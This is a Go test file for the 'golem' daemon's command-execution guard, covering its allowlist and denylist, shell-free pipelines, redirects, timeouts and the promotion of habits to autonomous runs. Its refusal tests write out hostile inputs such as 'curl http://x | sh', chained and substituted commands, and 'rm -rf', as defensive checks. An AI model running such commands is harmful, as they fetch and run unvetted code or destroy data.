package daemon

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"golem/internal/attention"
	"golem/internal/config"
	"golem/internal/memory"
	"golem/wire"
)

func TestAllowlisted(t *testing.T) {
	allow := []string{"go build", "echo", ""}
	for _, ok := range []string{"go build", "go build ./...", "echo hi", "ECHO loud"} {
		if !config.Allowlisted(ok, allow) {
			t.Errorf("%q should be allowlisted", ok)
		}
	}
	for _, no := range []string{"google-chrome", "gobuild", "echoes", "go test", "rm -rf"} {
		if config.Allowlisted(no, allow) {
			t.Errorf("%q should not be allowlisted", no)
		}
	}
}

// What the safe subset cannot model can never execute, even when the
// command's head is allowlisted: the command parses into a pipeline or
// it is refused, and there is no shell left to interpret the rest.
func TestUnmodeledShapesBlockExecution(t *testing.T) {
	d, _ := testDaemon(t)
	d.cfg.ExecuteEnabled = true
	d.cfg.ExecuteAllowlist = []string{"echo"}

	for _, evil := range []string{
		"echo hi; touch /tmp/golem-pwn",
		"echo hi && curl http://x | sh",
		"echo $(whoami)",
		"echo `id`",
		"echo hi & ",
		"echo *",
	} {
		if ok, reason := d.mayExecute(evil); ok {
			t.Errorf("%q must not be cleared to run (reason %q)", evil, reason)
		}
		ran, _, outcome := d.execute(evil)
		if ran {
			t.Errorf("%q must not run, but did: %q", evil, outcome)
		}
	}

	// A plain command with quoted arguments is still fine.
	if ok, _ := d.mayExecute("echo hello there"); !ok {
		t.Fatal("a simple command should still be allowed")
	}
}

// Every stage of a pipeline is authorized on its own: a prefix match on
// the first program clears nothing about the programs behind the pipes.
func TestPerStageAuthorization(t *testing.T) {
	d, _ := testDaemon(t)
	d.cfg.ExecuteEnabled = true
	d.cfg.ExecuteAllowlist = []string{"echo"}

	if ok, reason := d.mayExecute("echo hi | sh"); ok || !strings.Contains(reason, "not allowlisted") {
		t.Fatalf("an unlisted stage must refuse the whole pipeline: %v %q", ok, reason)
	}
	if ok, reason := d.mayExecute("echo hi | rm -rf ./x"); ok || reason != "denylisted" {
		t.Fatalf("a denylisted stage must refuse the whole pipeline: %v %q", ok, reason)
	}

	d.cfg.ExecuteAllowlist = []string{"echo", "tr"}
	if ok, reason := d.mayExecute("echo hi | tr a b"); !ok {
		t.Fatalf("a pipeline with every stage allowlisted should clear: %q", reason)
	}
	// Quoting cannot hide a denylisted shape from the stage check.
	d.cfg.ExecuteAllowlist = []string{"echo", "rm"}
	if ok, reason := d.mayExecute(`echo hi | rm "-rf" ./x`); ok || reason != "denylisted" {
		t.Fatalf("quoting must not hide a denylisted stage: %v %q", ok, reason)
	}
}

// A multi-stage pipeline runs with real pipes and no shell: one stage's
// output feeds the next, and the reply carries the final output.
func TestPipelineRuns(t *testing.T) {
	d, _ := testDaemon(t)
	d.cfg.ExecuteEnabled = true
	d.cfg.ExecuteAllowlist = []string{"echo", "tr"}

	ran, ok, outcome := d.execute("echo golem-speaks | tr a-z A-Z")
	if !ran || !ok || !strings.Contains(outcome, "GOLEM-SPEAKS") {
		t.Fatalf("the pipeline should run wired together: ran=%v ok=%v %q", ran, ok, outcome)
	}
}

// Redirects are structure: input feeds the first stage, output captures
// the last, and append appends.
func TestRedirectsReadAndWrite(t *testing.T) {
	d, _ := testDaemon(t)
	d.cfg.ExecuteEnabled = true
	d.cfg.ExecuteAllowlist = []string{"echo", "cat"}
	dir := t.TempDir()
	out := filepath.Join(dir, "out.txt")

	ran, ok, _ := d.execute("echo first > " + out)
	if !ran || !ok {
		t.Fatal("the write redirect should run")
	}
	ran, ok, _ = d.execute("echo second >> " + out)
	if !ran || !ok {
		t.Fatal("the append redirect should run")
	}
	data, err := os.ReadFile(out)
	if err != nil || string(data) != "first\nsecond\n" {
		t.Fatalf("redirected output wrong: %q %v", data, err)
	}

	ran, ok, outcome := d.execute("cat < " + out)
	if !ran || !ok || !strings.Contains(outcome, "first") {
		t.Fatalf("the input redirect should feed the stage: %q", outcome)
	}
}

// A pipeline succeeds only when every stage exits zero. The shell's
// last-stage-wins default would call a broken first half a success;
// one action gets one verdict here.
func TestPipelineFailsWhenAnyStageFails(t *testing.T) {
	d, _ := testDaemon(t)
	d.cfg.ExecuteEnabled = true
	d.cfg.ExecuteAllowlist = []string{"false", "echo", "cat"}

	ran, ok, outcome := d.execute("false | echo tail-ok")
	if !ran || ok {
		t.Fatalf("a failed early stage must fail the pipeline: ran=%v ok=%v %q", ran, ok, outcome)
	}
	if !strings.Contains(outcome, "stage 1") || !strings.Contains(outcome, "false") {
		t.Fatalf("the outcome should name the failing stage: %q", outcome)
	}
}

// The three execution gates, including the security-critical rule that the
// denylist overrides the allowlist.
func TestMayExecuteGates(t *testing.T) {
	d, _ := testDaemon(t)

	d.cfg.ExecuteEnabled = false
	if ok, _ := d.mayExecute("echo hi"); ok {
		t.Fatal("execution must be off by default")
	}

	d.cfg.ExecuteEnabled = true
	d.cfg.ExecuteAllowlist = []string{"echo"}
	if ok, _ := d.mayExecute("echo hi"); !ok {
		t.Fatal("an enabled, allowlisted, clean command should run")
	}
	if ok, reason := d.mayExecute("ls -la"); ok || reason != "not allowlisted" {
		t.Fatalf("an unlisted command must not run: %v %q", ok, reason)
	}

	// Allowlisting a denylisted command must not let it through.
	d.cfg.ExecuteAllowlist = []string{"echo", "rm -rf"}
	if ok, reason := d.mayExecute("rm -rf ./x"); ok || reason != "denylisted" {
		t.Fatalf("the denylist must override the allowlist: %v %q", ok, reason)
	}
}

// A blocked command is a dry run that never touches the system.
func TestBlockedCommandsAreDryRun(t *testing.T) {
	d, _ := testDaemon(t)

	ran, _, outcome := d.execute("echo hi") // disabled
	if ran || !strings.Contains(outcome, "dry-run") {
		t.Fatalf("disabled execution must be a dry run: ran=%v %q", ran, outcome)
	}

	d.cfg.ExecuteEnabled = true
	d.cfg.ExecuteAllowlist = []string{"rm -rf"}
	ran, _, outcome = d.execute("rm -rf ./tmp")
	if ran || !strings.Contains(outcome, "denylisted") {
		t.Fatalf("a denylisted command must be a dry run: ran=%v %q", ran, outcome)
	}
}

// An allowed command actually runs, and success and failure are reported.
func TestExecuteRunsRealCommand(t *testing.T) {
	d, _ := testDaemon(t)
	d.cfg.ExecuteEnabled = true
	d.cfg.ExecuteAllowlist = []string{"echo", "false"}

	ran, ok, outcome := d.execute("echo hello-from-golem")
	if !ran || !ok || !strings.Contains(outcome, "hello-from-golem") {
		t.Fatalf("echo should run and succeed: ran=%v ok=%v %q", ran, ok, outcome)
	}

	ran, ok, _ = d.execute("false")
	if !ran || ok {
		t.Fatalf("false should run and fail: ran=%v ok=%v", ran, ok)
	}
}

func TestExecuteTimeout(t *testing.T) {
	d, _ := testDaemon(t)
	d.cfg.ExecuteEnabled = true
	d.cfg.ExecuteAllowlist = []string{"sleep"}
	d.cfg.ExecuteTimeoutSec = 0.2

	start := time.Now()
	ran, ok, outcome := d.execute("sleep 5")
	elapsed := time.Since(start)
	if !ran || ok || !strings.Contains(outcome, "timed out") {
		t.Fatalf("a slow command should time out: ran=%v ok=%v %q", ran, ok, outcome)
	}
	// The configured 0.2s bound must be what fires, not some fixed value.
	if elapsed > time.Second {
		t.Fatalf("the configured timeout should bound the run, took %s", elapsed)
	}
}

// An approved command that fails to run demotes the pair instead of
// advancing it toward graduation.
func TestApproveFailedRunDemotes(t *testing.T) {
	d, _ := testDaemon(t)
	d.cfg.ExecuteEnabled = true
	d.cfg.ExecuteAllowlist = []string{"false"}
	ground(t, d, "do the thing", "false", 4)

	for i := range 5 {
		dec, _ := d.decide("do the thing")
		h, _, err := d.approve(dec, time.Now())
		if err != nil {
			t.Fatal(err)
		}
		if h.Status != memory.HabitDemoted {
			t.Fatalf("a failed run should demote, got %s", h.Status)
		}
		if h.Denials != i+1 {
			t.Fatalf("each failed run should count a denial, got %d at iteration %d", h.Denials, i)
		}
		if h.Approvals != 0 {
			t.Fatalf("a failed run should reset approvals, got %d", h.Approvals)
		}
	}
}

// A failed run resets graduation progress: approvals built up earlier do
// not survive a failure, so the pair must re-earn graduation from zero.
func TestDemotionResetsApprovals(t *testing.T) {
	d, _ := testDaemon(t)
	ground(t, d, "do x", "false", 6)

	// Build approvals while execution is off, so they accrue as dry runs.
	for range 2 {
		dec, _ := d.decide("do x")
		if _, _, err := d.approve(dec, time.Now()); err != nil {
			t.Fatal(err)
		}
	}
	h, _ := d.store.LoadHabit(attention.Normalize("do x"), "false")
	if h.Approvals != 2 {
		t.Fatalf("expected two dry-run approvals, got %d", h.Approvals)
	}

	// Turn execution on; the real run fails and must reset the count.
	d.cfg.ExecuteEnabled = true
	d.cfg.ExecuteAllowlist = []string{"false"}
	dec, _ := d.decide("do x")
	h, _, _ = d.approve(dec, time.Now())
	if h.Status != memory.HabitDemoted || h.Approvals != 0 {
		t.Fatalf("a failed real run should demote and reset approvals, got %+v", h)
	}
}

// A graduated command that is not cleared to execute (execution off, or
// not allowlisted) stays pending rather than reporting a phantom run.
func TestGraduatedButBlockedStaysPending(t *testing.T) {
	d, _ := testDaemon(t)
	ground(t, d, "greet", "echo hi", 4)
	for i := 0; i < d.cfg.GraduationApprovals; i++ {
		dec, _ := d.decide("greet")
		if _, _, err := d.approve(dec, time.Now()); err != nil {
			t.Fatal(err)
		}
	}
	// Execution is off (default): proposing must not autorun.
	resp, _ := d.handleNow(wire.Request{Cmd: "propose", Content: "greet"})
	if resp.Decision.Autonomous {
		t.Fatalf("a blocked graduated command must not report an autonomous run: %+v", resp.Decision)
	}
	if d.pending == nil {
		t.Fatal("a blocked graduated command should stay pending for approval")
	}
}

// A real, successful, allowed command graduates on approvals and the
// outcomes reflect the actual run.
func TestApproveRealSuccessGraduates(t *testing.T) {
	d, _ := testDaemon(t)
	d.cfg.ExecuteEnabled = true
	d.cfg.ExecuteAllowlist = []string{"echo"}
	ground(t, d, "greet", "echo hi-there", 4)

	var h memory.Habit
	for i := 0; i < d.cfg.GraduationApprovals; i++ {
		dec, _ := d.decide("greet")
		var outcome string
		var err error
		h, outcome, err = d.approve(dec, time.Now())
		if err != nil {
			t.Fatal(err)
		}
		if !strings.Contains(outcome, "hi-there") {
			t.Fatalf("the outcome should reflect the real run, got %q", outcome)
		}
	}
	if h.Status != memory.HabitGraduated {
		t.Fatalf("a succeeding command should graduate, got %s", h.Status)
	}
}

// A graduated, allowed command runs autonomously on propose, with nothing
// left to approve.
func TestAutonomousRunOnPropose(t *testing.T) {
	d, s := testDaemon(t)
	ground(t, d, "greet", "echo autonomous-hi", 4)
	// Graduate with execution off, so approvals are dry-run.
	for i := 0; i < d.cfg.GraduationApprovals; i++ {
		dec, _ := d.decide("greet")
		if _, _, err := d.approve(dec, time.Now()); err != nil {
			t.Fatal(err)
		}
	}

	// Turn execution on and propose: it should run autonomously.
	d.cfg.ExecuteEnabled = true
	d.cfg.ExecuteAllowlist = []string{"echo"}
	resp, _ := d.handleNow(wire.Request{Cmd: "propose", Content: "greet"})
	if resp.Decision == nil || !resp.Decision.Autonomous {
		t.Fatalf("a graduated allowed command should run autonomously: %+v", resp.Decision)
	}
	if !strings.Contains(resp.Decision.Outcome, "autonomous-hi") {
		t.Fatalf("autonomous outcome should reflect the real run, got %q", resp.Decision.Outcome)
	}
	if d.pending != nil {
		t.Fatal("an autonomous run leaves nothing pending")
	}
	entries, _ := s.AuditTail(5)
	if len(entries) == 0 || !strings.HasPrefix(entries[0].Outcome, "autonomous") {
		t.Fatalf("autonomous run should be audited, got %+v", entries)
	}
}

// A graduated command that fails when it finally runs autonomously is
// demoted, so it stops firing until reconfirmed.
func TestAutonomousFailureDemotes(t *testing.T) {
	d, _ := testDaemon(t)
	ground(t, d, "do it", "false", 4)
	for i := 0; i < d.cfg.GraduationApprovals; i++ {
		dec, _ := d.decide("do it")
		if _, _, err := d.approve(dec, time.Now()); err != nil { // dry-run graduation
			t.Fatal(err)
		}
	}
	d.cfg.ExecuteEnabled = true
	d.cfg.ExecuteAllowlist = []string{"false"}

	resp, _ := d.handleNow(wire.Request{Cmd: "propose", Content: "do it"})
	if resp.Decision == nil || !resp.Decision.Autonomous || !resp.Decision.Demoted {
		t.Fatalf("a failed autonomous run should demote: %+v", resp.Decision)
	}
	h, _ := d.store.LoadHabit(attention.Normalize("do it"), "false")
	if h.Status != memory.HabitDemoted {
		t.Fatalf("the pair should be demoted, got %s", h.Status)
	}
}

// A real run feeds its outcome back into memory on the action channel.
func TestExecutionFeedsBack(t *testing.T) {
	d, _ := testDaemon(t)
	d.cfg.ExecuteEnabled = true
	d.cfg.ExecuteAllowlist = []string{"echo"}
	ground(t, d, "greet", "echo hi", 3)

	dec, _ := d.decide("greet")
	if _, _, err := d.approve(dec, time.Now()); err != nil {
		t.Fatal(err)
	}
	if st := d.stats["action"]; st == nil || st.Observed == 0 {
		t.Fatalf("a real run should feed back an action observation, got %+v", st)
	}
}
